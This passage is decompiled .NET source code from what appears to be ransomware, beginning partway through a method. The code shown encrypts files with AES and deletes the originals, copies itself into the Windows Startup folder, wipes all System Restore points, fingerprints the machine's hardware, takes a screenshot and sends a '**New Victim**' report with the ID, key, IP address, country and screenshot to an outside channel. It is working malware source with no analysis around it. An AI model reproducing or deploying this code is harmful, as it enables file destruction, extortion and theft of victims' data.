							goto end_IL_0001;
						case 25:
						case 26:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0088:
					num = 15;
					num5 = fileStream_0.Read(buffer, 0, 4096);
					goto IL_009e;
					IL_009e:
					num = 16;
					cryptoStream.Write(buffer, 0, num5);
					goto IL_00ac;
					IL_00ed:
					num = 23;
					fileInfo = new FileInfo(string_1);
					break;
					IL_00ac:
					num = 17;
					num6 = checked(num6 + num5);
					goto IL_00b5;
					IL_000a:
					num = 2;
					fileStream_0 = new FileStream(string_1, FileMode.Open, FileAccess.Read);
					goto IL_0019;
					IL_0019:
					num = 3;
					fileStream_1 = new FileStream(string_2, FileMode.OpenOrCreate, FileAccess.Write);
					goto IL_0028;
					IL_0028:
					num = 4;
					fileStream_1.SetLength(0L);
					goto IL_0036;
					IL_0036:
					num = 5;
					buffer = new byte[4097];
					goto IL_0043;
					IL_0043:
					num = 6;
					num6 = 0L;
					goto IL_0048;
					IL_0048:
					num = 7;
					length = fileStream_0.Length;
					goto IL_0056;
					IL_0056:
					num = 8;
					rijndaelManaged = new RijndaelManaged();
					goto IL_005f;
					IL_005f:
					num = 9;
					if (enum1_0 == Enum1.const_0)
					{
						goto IL_006d;
					}
					goto IL_00b5;
					IL_006d:
					num = 11;
					cryptoStream = new CryptoStream(fileStream_1, rijndaelManaged.CreateEncryptor(byte_2, byte_3), CryptoStreamMode.Write);
					goto IL_00b5;
					IL_00b5:
					num = 14;
					if (num6 < length)
					{
						goto IL_0088;
					}
					goto IL_00bf;
					IL_00bf:
					num = 19;
					cryptoStream.Close();
					goto IL_00c9;
					IL_00c9:
					num = 20;
					fileStream_0.Close();
					goto IL_00d6;
					IL_00d6:
					num = 21;
					fileStream_1.Close();
					goto IL_00e3;
					IL_00e3:
					num = 22;
					if (enum1_0 != Enum1.const_0)
					{
						goto end_IL_0001_3;
					}
					goto IL_00ed;
					end_IL_0001_2:
					break;
				}
				num = 24;
				fileInfo.Delete();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 385;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private static byte[] smethod_5(string string_1)
	{
		char[] array = string_1.ToCharArray();
		int upperBound = array.GetUpperBound(0);
		checked
		{
			byte[] array2 = new byte[upperBound + 1];
			int upperBound2 = array.GetUpperBound(0);
			for (int i = 0; i <= upperBound2; i++)
			{
				array2[i] = (byte)Strings.Asc(array[i]);
			}
			SHA512Managed sHA512Managed = new SHA512Managed();
			byte[] array3 = sHA512Managed.ComputeHash(array2);
			byte[] array4 = new byte[32];
			int num = 0;
			do
			{
				array4[num] = array3[num];
				num++;
			}
			while (num <= 31);
			return array4;
		}
	}

	private static byte[] smethod_6(string string_1)
	{
		char[] array = string_1.ToCharArray();
		int upperBound = array.GetUpperBound(0);
		checked
		{
			byte[] array2 = new byte[upperBound + 1];
			int upperBound2 = array.GetUpperBound(0);
			for (int i = 0; i <= upperBound2; i++)
			{
				array2[i] = (byte)Strings.Asc(array[i]);
			}
			SHA512Managed sHA512Managed = new SHA512Managed();
			byte[] array3 = sHA512Managed.ComputeHash(array2);
			byte[] array4 = new byte[16];
			int num = 32;
			do
			{
				array4[num - 32] = array3[num];
				num++;
			}
			while (num <= 47);
			return array4;
		}
	}

	public static object smethod_7(string string_1)
	{
		object result = default(object);
		try
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Class13.string_4 + ".exe";
			if (File.Exists(text))
			{
				object_0 = new FileStream(text, FileMode.Open);
				return result;
			}
			File.Copy(string_1, text);
			object_0 = new FileStream(text, FileMode.Open);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[DllImport("Srclient.dll")]
	public static extern int SRRemoveRestorePoint(int int_2);

	private static void smethod_8()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		try
		{
			ManagementClass val = new ManagementClass("\\\\.\\root\\default", "systemrestore", new ObjectGetOptions());
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = instances.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					SRRemoveRestorePoint(Conversions.ToInteger(Conversions.ToUInteger(((ManagementBaseObject)val2).get_Item("sequencenumber")).ToString()));
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static object smethod_9()
	{
		try
		{
			return Operators.ConcatenateObject(Operators.ConcatenateObject(smethod_10(), (object)"_"), (object)smethod_11());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object smethod_10()
	{
		try
		{
			return Environment.UserName;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string smethod_11()
	{
		try
		{
			string text = smethod_12("Win32_Processor", "ProcessorId");
			text = text + "-" + smethod_12("Win32_BIOS", "SerialNumber");
			text = text + "-" + smethod_12("Win32_BaseBoard", "SerialNumber");
			text = text + "-" + smethod_12("Win32_VideoController", "Name");
			return smethod_13(text);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static string smethod_12(string string_1, string string_2)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Expected O, but got Unknown
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Expected O, but got Unknown
		try
		{
			string text = "";
			ManagementClass val = new ManagementClass(string_1);
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = instances.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					if (Operators.CompareString(text, "", false) == 0)
					{
						try
						{
							text = ((ManagementBaseObject)val2).get_Item(string_2).ToString();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
							continue;
						}
						break;
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return text;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			string result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string smethod_13(string string_1)
	{
		checked
		{
			try
			{
				MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
				byte[] array = mD5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(string_1));
				StringBuilder stringBuilder = new StringBuilder();
				int num = array.Length - 1;
				for (int i = 10; i <= num; i++)
				{
					stringBuilder.Append(array[i].ToString("x2"));
				}
				return stringBuilder.ToString().ToUpper();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string result = "Error";
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public static bool smethod_14(string string_1)
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Expected O, but got Unknown
		bool result = default(bool);
		try
		{
			Class10 @class = new Class10(Class10.string_0);
			@class._name = Class10.string_1;
			PictureBox val = new PictureBox();
			val.set_Image((Image)(object)smethod_15());
			val.get_Image().Save(Path.GetTempPath() + Environment.UserName + "-screenshot.jpg");
			WebClient webClient = new WebClient();
			string text = webClient.DownloadString("http://ip-api.com/csv/?fields=country,query");
			@class.method_0(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("**New Victim**" + Environment.NewLine + "ID : " + string_1 + Environment.NewLine + "Key : "), check.AES_Decrypttt(Interaction.GetSetting("F", "0", Class13.string_15, ""), smethod_11() + smethod_11())), (object)Environment.NewLine), (object)"IP : "), (object)text.Split(new char[1] { ',' })[1]), (object)"Country : "), (object)text.Split(new char[1] { ',' })[0]), (object)Environment.NewLine), (object)"OS : "), (object)((ServerComputer)Class2.Class1_0).get_Info().get_OSFullName()), (object)Environment.NewLine), (object)"Date&Time : "), (object)DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss"))), "Screenshot.jpg", Path.GetTempPath() + Environment.UserName + "-screenshot.jpg");
			result = true;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static Bitmap smethod_15()
	{
		//IL_0067: Unknown result type (might be due to invalid IL or missing references)
		//IL_006d: Expected O, but got Unknown
		Size size = new Size(((Computer)Class2.Class1_0).get_Screen().get_Bounds().Width, ((Computer)Class2.Class1_0).get_Screen().get_Bounds().Height);
		Bitmap val = new Bitmap(((Computer)Class2.Class1_0).get_Screen().get_Bounds().Width, ((Computer)Class2.Class1_0).get_Screen().get_Bounds().Height);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		val2.CopyFromScreen(new Point(0, 0), new Point(0, 0), size);
		return val;
	}
}
